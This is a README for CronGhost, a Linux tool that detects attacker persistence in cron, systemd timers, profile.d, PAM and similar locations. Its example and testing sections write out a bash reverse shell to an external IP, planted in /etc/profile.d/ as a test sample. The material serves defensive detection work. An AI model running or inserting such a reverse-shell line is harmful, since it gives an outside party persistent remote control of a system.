# CronGhost

```
  ____                  ____  _               _   
 / ___|_ __ ___  _ __  / ___|| |__   ___  ___| |_ 
| |   | '__/ _ \| '_ \| |  _ | '_ \ / _ \/ __| __|
| |___| | | (_) | | | | |_| || | | | (_) \__ \ |_ 
 \____|_|  \___/|_| |_|\____||_| |_|\___/|___/\__|

  Scheduled Task Shadow Scanner — v4.0.0
  Created by Artist-22
```

> **The only tool that scans all 14 Linux persistence locations simultaneously — with cryptographic baseline, entropy analysis, rootkit evasion detection, and self-integrity verification.**

---

## What is CronGhost?

CronGhost is a Linux security tool that detects malicious scheduled tasks, hidden autorun scripts, and attacker persistence mechanisms planted on your system.

Most security tools only check the obvious places. Attackers know this. They hide in the other locations that no scanner checks.

CronGhost checks all 14 — and then goes deeper than any other tool.

---

## The Problem It Solves

When an attacker compromises a Linux system they always plant a persistence mechanism — a hidden script that runs automatically so they can get back in even after passwords are changed or the initial vulnerability is patched.

These persistence scripts hide in locations most admins never look at:

```
/etc/profile.d/       runs on every single user login
/etc/pam.d/           runs on every authentication event
/etc/rc.local         runs at every system boot
XDG autostart         runs when the desktop starts
systemd timers        runs on a schedule invisibly
```

A real attacker case — a company wiped their entire server after a breach. Changed all passwords. Reinstalled services. Two days later the attacker was back. Why? Because their persistence script survived in `/etc/profile.d/` — a location nobody thought to check. CronGhost would have found it in 3 seconds.

---

## The 14 Locations CronGhost Scans

| # | Location | Why attackers use it |
|---|---|---|
| 1 | `/etc/crontab` | System-wide cron jobs |
| 2 | `/var/spool/cron/crontabs/` | Per-user cron jobs |
| 3 | `/etc/cron.d/` | Application cron drop folder |
| 4 | `/etc/cron.daily/` | Runs every day automatically |
| 5 | `/etc/cron.hourly/` | Runs every hour automatically |
| 6 | `/etc/cron.weekly/` | Runs every week automatically |
| 7 | `/etc/cron.monthly/` | Runs every month automatically |
| 8 | `/etc/anacrontab` | Runs missed jobs after reboot |
| 9 | `systemd timers` | Modern invisible scheduler |
| 10 | `/etc/profile.d/` | Runs on every login — most missed |
| 11 | `/etc/environment` | Loaded before the shell starts |
| 12 | `PAM exec module` | Runs on every authentication |
| 13 | `/etc/rc.local` | Runs at every single boot |
| 14 | `XDG autostart` | Targets workstations silently |

Locations 10 to 14 are where real attackers hide because no basic scanner checks them.

---

## Three Tiers of Detection

### Tier 1 — Pattern Detection
Scans file content for known attack patterns — reverse shells, download-and-execute payloads, encoded commands, suspicious file paths. Catches script kiddies and intermediate attackers instantly.

### Tier 2 — Intelligent Analysis
Goes beyond simple pattern matching:
- Package manager verification — did apt install this or did someone drop it manually?
- File age analysis — was this created at 2AM when no admin was watching?
- Owner verification — is this file owned by an unexpected user?
- Confidence scoring — every finding gets a score from 0 to 100%

### Tier 3 — Cryptographic Baseline
The most powerful layer. On first run CronGhost photographs every file as a SHA256 cryptographic hash. Every future scan compares against that snapshot. If any file changes even a single byte — CronGhost reports it with 92% confidence.

---

## Advanced Detection Features (v4.0.0)

### Self Integrity Verification
CronGhost verifies its own executable has not been tampered with before every scan. An expert attacker who modifies CronGhost to hide results — CronGhost catches that too.

### Entropy Analysis
Every file is scored for Shannon entropy. Normal shell scripts score 3.5 to 5.0. Encrypted or packed payloads score above 7.0. A high entropy score in a persistence location means a hidden encrypted payload is present.

### Network C2 Callback Detection
Automatically extracts IP addresses and domains from all persistence files. Any file containing an external IP or suspicious domain is flagged as a C2 indicator.

### Rootkit Evasion Check
Compares Python's raw `os.listdir()` against the output of `ls`. A rootkit hooks the ls command to hide files. If they disagree — CronGhost exposes what the rootkit is hiding.

### Hidden File Detector
Legitimate cron files are never dotfiles. CronGhost finds files starting with `.` in persistence directories — a classic attacker hiding technique.

### Timestamp Anomaly Detection
Detects files with timestamps from the future, zeroed timestamps, or timestamps that were backdated — all signs of attacker clock manipulation.

### Permission Anomaly Detection
Flags world-writable persistence files, SETUID bits, and SETGID bits — dangerous permission configurations that should never appear in persistence locations.

### Cross-Reference Detection
If the same malicious payload appears in multiple persistence locations — the attacker planted redundant persistence. CronGhost detects this pattern and reports it as a coordinated attack.

### Auto Quarantine
Moves suspicious files to a secure quarantine directory while leaving an empty decoy in place — so the attacker does not know their persistence was removed. Every quarantined file is preserved with metadata for forensic analysis.

### Live Watch Mode
Monitors all 14 persistence locations in real time. Checks every 30 seconds. Alerts immediately when any file is added, modified, or deleted. Press Ctrl+C to stop.

### Threat History Log
Every scan result is logged to a persistent history file at `/var/lib/cronghost/history.log`. Full audit trail of every finding across every scan.

---

## Real World Example

**The attack:**
```bash
echo 'bash -i >& /dev/tcp/185.220.101.42/4444 0>&1' > /etc/profile.d/updater.sh
```

**CronGhost catches it:**
```
[!!]  10/14  /etc/profile.d/          critical

[CRITICAL]  /etc/profile.d/updater.sh  [HIDDEN FILE] [C2 INDICATOR] [ODD HOUR]

  Confidence    [████████████████████] 95%
  Entropy       4.2 / 8.0

  Package       NOT in dpkg — manually placed
  Owner         root
  File age      created 2026-03-21 02:14  ODD HOUR
  C2 IPs        185.220.101.42

  Content hits
    +95  bash -i >& /dev/tcp/   classic bash reverse shell
```

---

## Installation

### Requirements
- Linux (Kali, Ubuntu, Debian or any Debian-based distro)
- Python 3.6 or higher
- Root access

### Install

```bash
git clone https://github.com/Artist-22/cronghost.git
cd cronghost
sudo bash install.sh
```

### Run

```bash
sudo cronghost
```

---

## First Time Setup

```
1. Run:    sudo cronghost
2. Choose  option 5 — Create baseline
3. Wait    for all files to be hashed
4. Done    — your clean system is on record
```

Every scan after this compares against your baseline.

---

## Usage

```
Options:

  1)  Run scan again
  2)  Export full report to file
  3)  Quarantine a suspicious file
  4)  Start live watch mode
  5)  Create or rebuild baseline
  6)  View threat history log
  7)  Quit
```

---

## Understanding the Output

### Scan line status
```
[OK]   — location is clean
[!!]   — suspicious or critical finding
[??]   — low confidence finding
```

### Verdict levels
```
[CRITICAL]    — confidence 80%+   act immediately
[SUSPICIOUS]  — confidence 55%+   investigate this
[LOW]         — below 55%         monitor it
```

### Threat flags
```
[HIDDEN FILE]        — dotfile in persistence location
[C2 INDICATOR]       — external IP or domain found inside file
[HIGH ENTROPY]       — encrypted or packed payload detected
[ODD HOUR]           — file created between 1AM and 5AM
[TIMESTAMP ANOMALY]  — clock manipulation detected
[BAD PERMISSIONS]    — world-writable or SETUID detected
```

### Baseline alerts
```
[CHANGED]    — file content changed since your clean snapshot
[NEW FILE]   — file did not exist when baseline was created
[DELETED]    — file existed in baseline but is now gone
```

---

## What Makes CronGhost Different

| Feature | Basic cron scanners | CronGhost v4.0.0 |
|---|---|---|
| Locations checked | 4 to 7 | **14** |
| False positive filtering | None | Smart whitelist + confidence scoring |
| Package manager check | No | **Yes — dpkg verification** |
| Cryptographic baseline | No | **Yes — SHA256 per file** |
| Entropy analysis | No | **Yes — detects packed payloads** |
| C2 callback detection | No | **Yes — IP and domain extraction** |
| Rootkit evasion check | No | **Yes — raw readdir vs ls** |
| Hidden file detection | No | **Yes — dotfile scanner** |
| Timestamp anomaly | No | **Yes — clock manipulation detection** |
| Self integrity check | No | **Yes — detects tool tampering** |
| Auto quarantine | No | **Yes — preserves evidence** |
| Live watch mode | No | **Yes — 30 second real time monitoring** |
| Threat history | No | **Yes — persistent audit log** |
| Cross-reference check | No | **Yes — multi-location payload detection** |

---

## Testing CronGhost

```bash
# Plant a fake malicious entry
sudo bash -c 'echo "bash -i >& /dev/tcp/185.220.101.42/4444 0>&1" > /etc/profile.d/test_backdoor.sh'

# Run CronGhost — it will flag it as CRITICAL
sudo cronghost

# Clean up after testing
sudo rm /etc/profile.d/test_backdoor.sh

# Run again — all clean
sudo cronghost
```

---

## Uninstall

```bash
cd cronghost
sudo bash uninstall.sh
```

Removes all files, icon, app menu entry, baseline data, quarantine, and history.

---

## Roadmap

- [ ] ProcessBlood — process ancestry attack detector
- [ ] PortDNA — port behavior fingerprinter
- [ ] EnvPoison — environment variable infection scanner
- [ ] ShadowUser — hidden user and privilege detector
- [ ] LibSnitch — shared library hijack detector
- [ ] SocketLie — socket truth verifier
- [ ] Unified suite — all tools under one installer

---

## Who is this for?

- Security researchers auditing Linux systems
- System administrators protecting production servers
- Penetration testers verifying their own persistence detection
- Students learning Linux security and forensics
- Anyone who wants to know if their Linux system has been compromised

---

## Feedback and Bug Reports

Found a bug or have a feature request? Open an issue on GitHub at github.com/Artist-22/cronghost — all feedback is welcome.

---

## Legal and Ethical Use

CronGhost is designed for use on systems you own or have explicit written permission to audit. Using this tool against systems you do not own is illegal and unethical. The author takes no responsibility for misuse.

---

## License

CronGhost is protected under a Custom Restrictive License.

```
✅ You can download and use CronGhost
✅ You can use it for personal and professional security auditing
✅ You can share the link to this repository
❌ You cannot copy or redistribute the source code
❌ You cannot build another tool based on this code
❌ You cannot sell or commercially exploit CronGhost
❌ You cannot claim ownership or co-authorship
```

See the `LICENSE` file for full terms.

---

## Author

**Artist-22**
GitHub: [@Artist-22](https://github.com/Artist-22)

> *"The best tools in cybersecurity history were built by individuals — not corporations."*

---

*CronGhost — Because persistence kills. Find it first.*
